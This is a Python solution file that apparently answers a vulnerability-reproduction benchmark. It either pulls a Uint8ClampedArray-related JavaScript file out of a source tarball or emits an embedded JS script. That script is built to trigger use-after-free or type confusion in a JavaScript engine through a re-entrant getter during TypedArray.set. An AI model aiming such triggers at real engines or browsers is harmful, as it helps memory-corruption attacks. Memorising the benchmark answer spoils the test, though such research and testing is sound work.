import tarfile


class Solution:
    def solve(self, src_path: str) -> bytes:
        embedded = self._extract_candidate_poc(src_path)
        if embedded is not None:
            return embedded
        return self._generate_default_poc()

    def _extract_candidate_poc(self, src_path: str):
        try:
            tf = tarfile.open(src_path, "r:*")
        except Exception:
            return None

        target_length = 6624
        best_data = None
        best_diff = None

        try:
            for member in tf.getmembers():
                if not member.isfile():
                    continue

                name = member.name.lower()
                if not (name.endswith(".js") or name.endswith(".mjs")):
                    continue

                # Heuristically skip very small or very large JS files
                if member.size < 100 or member.size > 20000:
                    continue

                try:
                    f = tf.extractfile(member)
                except Exception:
                    continue
                if f is None:
                    continue

                try:
                    raw = f.read()
                except Exception:
                    continue
                if not raw:
                    continue

                # Only care about files that reference Uint8ClampedArray
                lower = raw.lower()
                if b"uint8clampedarray" not in lower:
                    continue

                diff = abs(len(raw) - target_length)
                if best_data is None or diff < best_diff:
                    best_data = raw
                    best_diff = diff
        finally:
            try:
                tf.close()
            except Exception:
                pass

        # Only accept a candidate if it is reasonably close in size
        if best_data is not None and best_diff is not None and best_diff <= 512:
            return best_data
        return None

    def _generate_default_poc(self) -> bytes:
        poc = r"""
// Generic stress test targeting Uint8ClampedArray typed array implementation.
// Designed to exercise interactions between Uint8ClampedArray and other
// typed arrays and to trigger potential use-after-free bugs in engines where
// Uint8ClampedArray is not implemented as a proper typed array.

if (typeof Uint8ClampedArray !== "function")
    throw new Error("Uint8ClampedArray is not available");

function makeBuffer(size) {
    var buffer = new ArrayBuffer(size);
    var view1 = new Uint8Array(buffer);
    var view2 = new Uint8ClampedArray(buffer);

    for (var i = 0; i < view1.length; ++i)
        view1[i] = (i * 7) & 0xff;

    return { buffer: buffer, view1: view1, view2: view2 };
}

function hammerOnce() {
    var obj = makeBuffer(1024);
    var c = obj.view2;

    // Create multiple overlapping views into the same buffer.
    var views = [];
    for (var i = 0; i < 32; ++i)
        views.push(c.subarray(i, c.length - i));

    // An object whose indexed properties have a getter that mutates
    // Uint8ClampedArray internals and performs heavy allocation.
    var evil = {};
    evil.length = 64;
    for (var i = 0; i < evil.length; ++i)
        evil[i] = i & 0xff;

    Object.defineProperty(evil, 0, {
        configurable: true,
        get: function () {
            // Mutate prototypes while TypedArray.set is in progress.
            try {
                Object.setPrototypeOf(Uint8ClampedArray.prototype, Uint8Array.prototype);
            } catch (e) {
            }

            // Drop references to views to encourage GC of backing stores.
            views.length = 0;

            // Allocate a bunch of new Uint8ClampedArray instances that
            // share and discard ArrayBuffers, trying to shake out UAF bugs.
            var junk = [];
            for (var j = 0; j < 64; ++j) {
                try {
                    junk.push(new Uint8ClampedArray(256));
                } catch (e) {
                }
            }
            junk = null;

            return 0;
        }
    });

    try {
        // If Uint8ClampedArray is incorrectly wired into the TypedArray
        // hierarchy, re-entrancy during this call can lead to type
        // confusion or use-after-free in vulnerable engines.
        c.set(evil, 0);
    } catch (e) {
        // Ignore JS-level errors; we are hunting for engine-level issues.
    }

    // Additional allocations to make GC more likely.
    var extra = [];
    for (var k = 0; k < 128; ++k) {
        extra.push(new Uint8ClampedArray(128));
    }
    extra = null;
}

for (var i = 0; i < 200; ++i)
    hammerOnce();

if (typeof gc === "function") {
    for (var j = 0; j < 10; ++j)
        gc();
}
"""
        return poc.encode("utf-8")
